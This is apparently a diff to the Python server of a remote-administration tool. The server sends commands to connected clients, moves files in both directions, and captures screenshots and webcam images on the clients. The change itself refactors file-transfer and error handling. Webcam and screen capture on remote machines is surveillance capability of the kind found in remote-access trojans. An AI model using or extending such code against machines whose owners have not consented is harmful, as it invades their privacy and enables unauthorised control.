@@ -54,17 +54,6 @@ broadcast | Broadcast command to all connected clients
 shutdown | Shutdown Server"""
 
 
-def read_file(path: str, block_size: int = 32768) -> bytes:
-    """ Generator for reading files """
-    with open(path, 'rb') as rb_file:
-        while True:
-            piece = rb_file.read(block_size)
-            if piece:
-                yield piece
-            else:
-                return
-
-
 def errors(error: Exception, line: bool = True) -> str:
     """ Error Handler """
     error_class = error.__class__.__name__
@@ -231,28 +220,33 @@ class Client():
         self.send_json(['RESTART'])
         return self.recv_json()
 
-    def send_file(self, file_to_transfer: str, save_as: str) -> Union[str, None]:
+    def send_file(self, file_to_transfer: str, save_as: str, block_size: str = 32768) -> Union[str, None]:
         """ Send file from Server to Client """
         # returns None/error
-        if not os.path.isfile(file_to_transfer):
-            return "FileNotFoundError"
-        self.send_json(['SEND_FILE', save_as])
-        if self.receive() == b'FILE_TRANSFER_ERROR':
-            self.send(b'RECEIVED')
-            return self.receive().decode()
-        for block in read_file(file_to_transfer):
-            self.send(block)
-            self.receive()
+        try:
+            self.send_json(['SEND_FILE', save_as])
+            if self.receive() == b'FILE_TRANSFER_ERROR':
+                self.send(b'RECEIVED')
+                return self.receive().decode()
+            with open(file_to_transfer, 'rb') as file:
+                while True:
+                    block = file.read(block_size)
+                    if not block:
+                        break
+                    self.send(block)
+                    self.receive()
+
+        except (FileNotFoundError, PermissionError) as error:
+            return errors(error)
 
         self.send(b'FILE_TRANSFER_DONE')
         self.receive()
-        return None
 
     def receive_file(self, file_to_transfer: str, save_as: str) -> Union[str, None]:
         """ Transfer file from Client to Server """
         # returns None/error
         self.send_json(['RECEIVE_FILE', file_to_transfer])
-        with open(save_as, 'wb') as wb_file:
+        with open(save_as, 'wb') as file:
             while 1:
                 data = self.receive()
                 if data == b'FILE_TRANSFER_ERROR':
@@ -260,12 +254,9 @@ class Client():
                     os.remove(save_as)
                     return self.receive().decode()
                 if data == b'FILE_TRANSFER_DONE':
-                    self.send(b'RECEIVED')
                     break
-                wb_file.write(data)
+                file.write(data)
                 self.send(b'RECEIVED')
-        self.receive()
-        return None
 
     def screenshot(self, save_as: str = None) -> Union[str, None]:
         """ Take screenshot on Client """
@@ -277,9 +268,8 @@ class Client():
         if data == b'ERROR':
             self.send(b'RECEIVING')
             return self.receive()
-        with open(save_as, 'wb') as _file:
-            _file.write(data)
-        return None
+        with open(save_as, 'wb') as file:
+            file.write(data)
 
     def webcam(self, save_as: str = None) -> Union[str, None]:
         """ Capture webcam """
@@ -289,7 +279,7 @@ class Client():
         self.send_json(['WEBCAM'])
         data = self.receive()
         if data == b'ERROR':
-            return None
+            return
         with open(save_as, 'wb') as _file:
             _file.write(data)
         return save_as
@@ -512,7 +502,7 @@ class ServerCLI(Server):
             client = self.clients[int(target)]
         except (ValueError, IndexError):
             logging.error('Not a valid selection')
-            return None
+            return
         print(f"You are now connected to {client.address[2]}")
         return client
 
